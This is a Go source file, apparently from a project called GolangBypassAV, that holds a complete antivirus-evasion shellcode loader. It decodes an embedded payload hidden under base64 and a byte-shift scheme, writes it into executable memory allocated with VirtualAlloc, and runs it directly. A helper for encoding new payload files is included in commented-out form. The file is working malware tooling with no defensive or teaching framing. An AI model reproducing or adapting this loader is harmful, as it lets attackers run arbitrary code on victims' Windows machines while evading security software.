package main

import (
	"GolangBypassAV/encry"
	"encoding/base64"
	"syscall"
	"time"
	"unsafe"
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
)

var kk = []byte{0x23, 0x32}

func getEnCode(data []byte) string {
	bdata1 := base64.StdEncoding.EncodeToString(data)
	bydata1 := []byte(bdata1)
	var shellcode []byte

	for i := 0; i < len(bydata1); i++ {
		shellcode = append(shellcode, bydata1[i]+kk[0]-kk[1])
	}
	return base64.StdEncoding.EncodeToString(shellcode)
}

var (
	kernel32      = syscall.MustLoadDLL("kernel32.dll")
	ntdll         = syscall.MustLoadDLL("ntdll.dll")
	VirtualAlloc  = kernel32.MustFindProc("VirtualAlloc")
	RtlCopyMemory = ntdll.MustFindProc("RtlCopyMemory")
)

func getDeCode(string2 string) []byte {

	ss, _ := base64.StdEncoding.DecodeString(string2)
	string2 = string(ss)
	var shellcode []byte

	bydata := []byte(string2)

	for i := 0; i < len(bydata); i++ {
		shellcode = append(shellcode, bydata[i]-kk[0]+kk[1])
	}
	ssb, _ := base64.StdEncoding.DecodeString(string(shellcode))
	return ssb

}

func exe(charcode []byte) {
	addr, _, err := VirtualAlloc.Call(0, uintptr(len(charcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if err != nil && err.Error() != "The operation completed successfully." {
		syscall.Exit(0)
	}
	_, _, err = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&charcode[0])), uintptr(len(charcode)))
	if err != nil && err.Error() != "The operation completed successfully." {
		syscall.Exit(0)
	}
	time.Sleep(2 * time.Second)
	syscall.Syscall(addr, 0, 0, 0, 0)
}

func getFileShellCode(file string) []byte {
	data := encry.ReadFile(file)
	return data
}

func main() {
	//fmt.Println(1)

	//fmt.Print(getEnCode(getFileShellCode("C:\\Users\\Administrator\\Desktop\\payload.bin")))

	bbdata := "IDZaNSZBNWBqMjIyMjY3Q0JHM0RGR0s6PlU7XUQ6ZURKNlo9RllZOloiOlhEOmVqRjZYQWUhYTxFRTk7RDU5MmM1aVlXMjpkOjY5M2pCIjMyVDlaKEc7M0ZGWj1GWjQ9QltpOjJVM15YSVhKNGg7IlRgZjJaMjIyMjZaN2g5Q19EMjlCRjplOjg2RD1CNDM7MlU1W0dcWyBqRjg9PzpZOjJVSz8+VF06PlQ0ZEJUOTs1RjYzaEVbWFVXNz4yIWhcNDZGJiFJSUpINkQ9QjRDOzJVM15CSmQ+RDZEPUIzaTsyVTMzWmhEOkQyOUJCR1kzSDcmS0hcN0pCR10zSFxaNSg0MzNGZyBYSDY3S0hcWj02Zl1BICAgIElIYDJEUyYkUkgmYVNeRyEyNjdIREpfXkU6X2lCU2E+VWpKOSAqRzo+VF06PlU7Pz5UMz8+VF0zRjY3QkJTYCdHX15fICpJY1QiYTpaVDczZjtCRTIyMz8+VF0zRkY3Q1JYPzNGRjgnRyVeV2lnIEcnIl1TRDpfM0Q1OURESl9KRUU5O0ZeWDIyXDQ2Rl07M2ZmZUc9W2cgIkZaO2lcWjVoIjNiNF0qOlpXNzpaVWE7aSk1ICAgICBFRTk7Rl07M2ZaITg4OWcgIkpJMjUlSFUyQjIyREEgQTUlRD4yQjIyJypBYSYyNjIyQFpaICAgID0hXUtVRkoyMyMjYzpCSTZAYjQ8PFJKIzNhV1UcYCJTQFRqJSEgVSQ/RltTPyY1JkFZRSM3YGFcVlIgVSEqKFhkZUQqQz4zIDlmVlM3KCpiR0FAREMoaEdFWVpAJks6IiQ9KjY0WVlJYlgzR1QjR2o9RjdfS0gmIUBaMz9TJGFhUzhpWT1rRmY+NDJgSiMqZVQ4NyFSSDtkS0VkWEVHPztDRDImPVsyKDo3VWFTXkNnVSQ+WEVdQlg/WiVpQGozSUUiVCM/NWRYRzk7YUs4R2ZVNCkiPVsyKDo2O0FERkYmQCFHQEdHP0VDRiFhNUJgMipIYkg1WTxiP1hEJWFjKkVeOWRLIGdZZDVSNzsoY0ZpKVUjNCVTSmVkRmZSYjgnQiRmPSFiNSBGKDhUaWM8SUtaXVZlKlYpWlooJ1RAOEZaKiY/XGhgM1ghY1lbM2pZYSkgXGFeMkgga0tGWD8hZDtSZEAmIEtpRFlrO1tKI1MjPDw7Q1UyP1Y5OkY8I2IzNmBaWyQlZD5eMxxJNig+RVRkNWYcWyNoVjlJOFgiP1U8QCU+WEZTOypUZCFWPSQkNCg6YVZLNkdqS0tqVik2NmVWaVhGY1hES2ldXFNbZCMoWzc1XTNYaUocMl02X1chJl4qKWRDaltKOGY1IklTUyQ0KRxAIUZKaF9BI2hrazIyQlMoaGVSO0ggKkc6PlReJzIyMzIyNjglMjMyMjI2OCZCMjIyMjY4J0g8Q0UmVyBHRDs/RUYhWjsmIVo7KUZaOyNcOCUyNDIyMjZeOxxGOCc2YVI7JWcgR0Q6QTY6OkkyVT1LXlpoVToyVEA3aDlJSUg3WUpEMkYyMjIyMkY+QWBfICQgIGtGIT1bNiNARCVpP2tYZj9bNjI2W0NIVjIuLg=="
	shellCodeHex := getDeCode(bbdata)
	exe(shellCodeHex)
}
